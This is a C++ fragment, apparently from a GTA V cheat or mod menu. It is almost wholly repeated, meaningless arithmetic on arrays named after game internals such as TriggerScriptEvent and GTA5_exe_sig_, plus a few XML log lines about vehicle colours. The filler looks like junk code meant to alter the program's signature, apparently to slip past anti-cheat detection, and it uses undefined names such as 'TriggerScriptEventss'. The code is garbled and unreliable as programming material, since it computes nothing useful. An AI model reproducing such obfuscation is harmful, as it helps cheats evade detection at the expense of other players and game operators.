				TriggerScriptEvent[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (TriggerScriptEvent[1] * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] + 0xA12;
				TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
				a1 = (-TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (22)) / (2 * TriggerScriptEvent[2]);
			}
			else
			{
				TriggerScriptEvent[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] / (TriggerScriptEvent[2] * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[1] = (0xB2 * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
				TriggerScriptEvent[1] = (0xA12 * 0xA) + TriggerScriptEvent[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
				TriggerScriptEvent[1] = (0xB2 * 0xA) + (TriggerScriptEvent[2] * 0xA) - 0xBB;
				TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			}
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (2)) / (2 * TriggerScriptEvent[2]);
			a = 0.0f;
			b = 0.0f;
			if (TriggerScriptEvent[4] > 50.0f)
			{
				TriggerScriptEvent[4] = TriggerScriptEvent[1];
			}
			a2 = (TriggerScriptEvent[4]) / (2 * TriggerScriptEvent[2]);
			a1 = (TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (TriggerScriptEvent[2] * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = 0xB2 * 2;
			a = 0.0f;
			a1 = (TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
			b = 0.0f;
			TriggerScriptEvent[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
			TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (TriggerScriptEvent[1] + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] + 0xA12;
			TriggerScriptEvent[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1];
			TriggerScriptEvent[4] = TriggerScriptEvent[1];
			TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
			TriggerScriptEvent[1] = (0xB2 + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
			TriggerScriptEvent[1] = (0xA12 * 0xA) + TriggerScriptEvent[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + TriggerScriptEvent[1];
			TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1];
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] + (2)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB2 * 0xA) + (TriggerScriptEvent[2] * 0xA) * 0xBB;
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			if (TriggerScriptEvent[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			Extern_Reader::LOG::LogSemHora("<LrDashboard>0</LrDashboard>");
			Extern_Reader::LOG::LogSemHora("<LrXenonHeadlights>0</LrXenonHeadlights>");
			Extern_Reader::LOG::LogSemHora("</Colours>");

			if (offset > aaaaaa)
			{
				matriz[2] = (ponteiro * 0xA) + (0xB1231 * 0xA) - offset / (ponteiro * 0xA) + (0xB1231 * 0xA) - offset;
				matriz[3] = (0xB1231 * 0xA) - (ponteiro * 0xA) + (0xB1231 * 0xA) - matriz[2] + aaaaaa;
				matriz[4] = (0xA12 * 0xA) + matrizss[2] * (ponteiro * 0xA) + (0xB1231 * 0xA) - offset;
				matriz[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
				matriz[7] = (0xB1231 * 0xA) + matriz[2];
				a1 = (-matriz[3] + (65)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (22)) / (2 * matriz[2]);
			}
			else
			{
				offset = (ponteiro * 0xA) + (0xB1231 * 0xA) - offset / (matriz[2] * 0xA) + (ponteiro * 0xA) - offset;
				offset = (ponteiro * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - offset + aaaaaa;
				offset = (0xA12 * 0xA) + matriz[2] * (ponteiro * 0xA) + (ponteiro * 0xA) - offset;
				offset = (0xB1231 * 0xA12) + (ponteiro * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - ponteiro + 0xA12;
				offset = (ponteiro * 0xA) + (matriz[2] * 0xA) - 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-matriz[3] + (4)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			}
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (5)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (2)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (2)) / (2 * matriz[2]);
			if (matriz[4] > 50.0f)
			{
				matriz[4] = matriz[1];
			}
			a2 = (matriz[4]) / (2 * matriz[2]);
			a1 = (matriz[3] + (2)) / (2 * matriz[2]);
			offset = (ponteiro * 0xA) + (0xB1231 * 0xA) / (matriz[2] * 0xA) + (ponteiro * 0xA) - offset;
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (matriz[3] + (5)) / (2 * matriz[2]);
			aaaaaa = ponteiro * 2;
			a = 0.0f;
			a1 = (matriz[3] + (4)) / (2 * matriz[2]);
			b = 0.0f;
			matriz[3] = (0xB1231 * 0xA) + (ponteiro * 0xA) + (0xB1231 * 0xA) + matriz[2] + aaaaaa;
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			offset = (0xB1231 * 0xA12) + (ponteiro + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + ponteiro + 0xA12;
			matriz[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
			matriz[2] = (ponteiro * 0xA) + (0xB1231 * 0xA) + offset / (ponteiro * 0xA) + (0xB1231 * 0xA) + offset;
			matriz[4] = matriz[1];
			matriz[7] = (0xB1231 * 0xA) + matriz[2];
			offset = (ponteiro + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + offset + aaaaaa;
			offset = (0xA12 * 0xA) + matriz[2] * (ponteiro * 0xA) + (ponteiro * 0xA) + offset;
			matriz[4] = (0xA12 * 0xA) + matrizss[2] * (ponteiro * 0xA) + (0xB1231 * 0xA) + offset;
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			a2 = (matriz[4] + (2)) / (2 * matriz[2]);
			offset = (ponteiro * 0xA) + (matriz[2] * 0xA) * 0xBB;
			offset = (0xB1231 * 0xA) + 0xA12;
			offset = (0xB1231 * 0xA) + 0xA12;
			if (offset > aaaaaa)
			{
			}
			else
				a1 = (matriz[3] + (65)) / (2 * matriz[2]);
			a2 = (matriz[4] - (3)) / (2 * matriz[2]);

			if (matriz[1] > aaaaaa)
			{
				matriz[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1];
				matriz[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[2] + aaaaaa;
				matriz[4] = (0xA12 * 0xA) + matrizss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1];
				matriz[5] = (0xB1231 * 0xA12) + (matriz[1] * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - matriz[1] + 0xA12;
				matriz[7] = (0xB1231 * 0xA) + matriz[2];
				a1 = (-matriz[3] + (65)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (22)) / (2 * matriz[2]);
			}
			else
			{
				matriz[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1] / (matriz[2] * 0xA) + (0xB2 * 0xA) - matriz[1];
				matriz[1] = (0xB2 * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - matriz[1] + aaaaaa;
				matriz[1] = (0xA12 * 0xA) + matriz[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - matriz[1];
				matriz[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
				matriz[1] = (0xB2 * 0xA) + (matriz[2] * 0xA) - 0xBB;
				matriz[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-matriz[3] + (4)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			}
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (5)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (2)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (2)) / (2 * matriz[2]);
			a = 0.0f;
			b = 0.0f;
			if (matriz[4] > 50.0f)
			{
				matriz[4] = matriz[1];
			}
			a2 = (matriz[4]) / (2 * matriz[2]);
			a1 = (matriz[3] + (2)) / (2 * matriz[2]);
			matriz[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (matriz[2] * 0xA) + (0xB2 * 0xA) - matriz[1];
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (matriz[3] + (5)) / (2 * matriz[2]);
			aaaaaa = 0xB2 * 2;
			a = 0.0f;
			a1 = (matriz[3] + (4)) / (2 * matriz[2]);
			b = 0.0f;
			matriz[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[2] + aaaaaa;
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			matriz[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
			matriz[5] = (0xB1231 * 0xA12) + (matriz[1] + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + matriz[1] + 0xA12;
			matriz[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1];
			matriz[4] = matriz[1];
			matriz[7] = (0xB1231 * 0xA) + matriz[2];
			matriz[1] = (0xB2 + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + matriz[1] + aaaaaa;
			matriz[1] = (0xA12 * 0xA) + matriz[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + matriz[1];
			matriz[4] = (0xA12 * 0xA) + matrizss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1];
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			a2 = (matriz[4] + (2)) / (2 * matriz[2]);
			matriz[1] = (0xB2 * 0xA) + (matriz[2] * 0xA) * 0xBB;
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			if (matriz[1] > aaaaaa)
			{
			}
			else
				a1 = (matriz[3] + (65)) / (2 * matriz[2]);
			a2 = (matriz[4] - (3)) / (2 * matriz[2]);

			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				GTA5_exe_sig_[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				GTA5_exe_sig_[3] = (0xB1231 * 0xA) - (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
				GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
				a1 = (-GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (22)) / (2 * GTA5_exe_sig_[2]);
			}
			else
			{
				offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (GTA5_exe_sig_[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (PED_TO_NET_ * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - offset + NETWORK_GET_ENTITY_IS_LOCAL_;
				offset = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (0xB1231 * 0xA12) + (PED_TO_NET_ * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - PED_TO_NET_ + 0xA12;
				offset = (PED_TO_NET_ * 0xA) + (GTA5_exe_sig_[2] * 0xA) - 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			}
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (2)) / (2 * GTA5_exe_sig_[2]);
			if (GTA5_exe_sig_[4] > 50.0f)
			{
				GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			}
			a2 = (GTA5_exe_sig_[4]) / (2 * GTA5_exe_sig_[2]);
			a1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) / (GTA5_exe_sig_[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = PED_TO_NET_ * 2;
			a = 0.0f;
			a1 = (GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
			b = 0.0f;
			GTA5_exe_sig_[3] = (0xB1231 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			offset = (0xB1231 * 0xA12) + (PED_TO_NET_ + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + PED_TO_NET_ + 0xA12;
			GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
			GTA5_exe_sig_[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
			offset = (PED_TO_NET_ + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + offset + NETWORK_GET_ENTITY_IS_LOCAL_;
			offset = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) + offset;
			GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] + (2)) / (2 * GTA5_exe_sig_[2]);
			offset = (PED_TO_NET_ * 0xA) + (GTA5_exe_sig_[2] * 0xA) * 0xBB;
			offset = (0xB1231 * 0xA) + 0xA12;
			offset = (0xB1231 * 0xA) + 0xA12;
			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);

			if (GTA5_exe_sig_[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				GTA5_exe_sig_[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (GTA5_exe_sig_[1] * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] + 0xA12;
				GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
				a1 = (-GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (22)) / (2 * GTA5_exe_sig_[2]);
			}
			else
			{
				GTA5_exe_sig_[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] / (GTA5_exe_sig_[2] * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[1] = (0xB2 * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
				GTA5_exe_sig_[1] = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
				GTA5_exe_sig_[1] = (0xB2 * 0xA) + (GTA5_exe_sig_[2] * 0xA) - 0xBB;
				GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			}
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (2)) / (2 * GTA5_exe_sig_[2]);
			a = 0.0f;
			b = 0.0f;
			if (GTA5_exe_sig_[4] > 50.0f)
			{
				GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			}
			a2 = (GTA5_exe_sig_[4]) / (2 * GTA5_exe_sig_[2]);
			a1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (GTA5_exe_sig_[2] * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = 0xB2 * 2;
			a = 0.0f;
			a1 = (GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
			b = 0.0f;
			GTA5_exe_sig_[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
			GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (GTA5_exe_sig_[1] + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] + 0xA12;
			GTA5_exe_sig_[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1];
			GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
			GTA5_exe_sig_[1] = (0xB2 + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
			GTA5_exe_sig_[1] = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + GTA5_exe_sig_[1];
			GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1];
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] + (2)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB2 * 0xA) + (GTA5_exe_sig_[2] * 0xA) * 0xBB;
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			if (GTA5_exe_sig_[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);


			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				TriggerScriptEvent[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				TriggerScriptEvent[3] = (0xB1231 * 0xA) - (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
				TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
				a1 = (-TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (22)) / (2 * TriggerScriptEvent[2]);
			}
			else
			{
				offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (TriggerScriptEvent[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (PED_TO_NET_ * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - offset + NETWORK_GET_ENTITY_IS_LOCAL_;
				offset = (0xA12 * 0xA) + TriggerScriptEvent[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (0xB1231 * 0xA12) + (PED_TO_NET_ * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - PED_TO_NET_ + 0xA12;
				offset = (PED_TO_NET_ * 0xA) + (TriggerScriptEvent[2] * 0xA) - 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			}
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (5) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (2)) / (2 * TriggerScriptEvent[2]);
			if (TriggerScriptEvent[4] > 50.0f)
			{
				TriggerScriptEvent[4] = TriggerScriptEvent[1];
			}
			a2 = (TriggerScriptEvent[4]) / (2 * TriggerScriptEvent[2]);
			a1 = (TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) / (TriggerScriptEvent[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = PED_TO_NET_ * 2;
			a = 0.0f;
			a1 = (TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
			b = 0.0f;
			TriggerScriptEvent[3] = (0xB1231 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			offset = (0xB1231 * 0xA12) + (PED_TO_NET_ + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + PED_TO_NET_ + 0xA12;
			TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
			TriggerScriptEvent[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			TriggerScriptEvent[4] = TriggerScriptEvent[1];
